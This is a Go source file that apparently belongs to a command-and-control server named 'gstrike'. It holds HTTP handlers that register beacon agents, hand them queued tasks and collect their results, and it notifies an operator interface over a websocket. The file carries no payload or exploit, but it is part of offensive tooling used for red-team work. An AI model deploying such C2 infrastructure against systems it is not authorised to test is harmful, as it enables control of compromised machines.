package router

import (
	"encoding/json"
	"fmt"
	"gstrike/pkg/relay"
	"gstrike/pkg/util"
	"log"
	"net/http"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

func RegisterAgentHandler(w http.ResponseWriter, r *http.Request) {
	var agent util.Agent
	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
		fmt.Printf("error: %v\n", err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	agent.ID = uuid.New().String()
	agent.LastSeen = time.Now()

	util.Agents[agent.ID] = agent

	// Sending update to UI
	type Payload struct {
		Type    string `json:"type"`
		AgentID string `json:"agentID"`
	}

	msg := Payload{
		Type:    "beacon_register",
		AgentID: agent.ID,
	}

	relay.WSConn.WriteJSON(msg)

	// Sending UUID back to agent
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agent)
}

func PostResultHandler(w http.ResponseWriter, r *http.Request) {
	var result util.Result
	err := json.NewDecoder(r.Body).Decode(&result)

	if err != nil {
		log.Printf("Decode error: %v\n", err)
		http.Error(w, "Invalid result", http.StatusBadRequest)
		return
	}

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	util.Results = append(util.Results, result)
	// display the results to operator via websocket here?
	w.WriteHeader(http.StatusCreated)
}

func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
	agentID := mux.Vars(r)["agentID"]

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	agentTasks := util.Tasks[agentID]
	util.Tasks[agentID] = []util.Task{}

	//log.Printf("[>] Agent (%s) pulled (%d) task(s)", agentID, len(agentTasks))

	// Send the tasks in JSON format to beacon
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agentTasks)
}
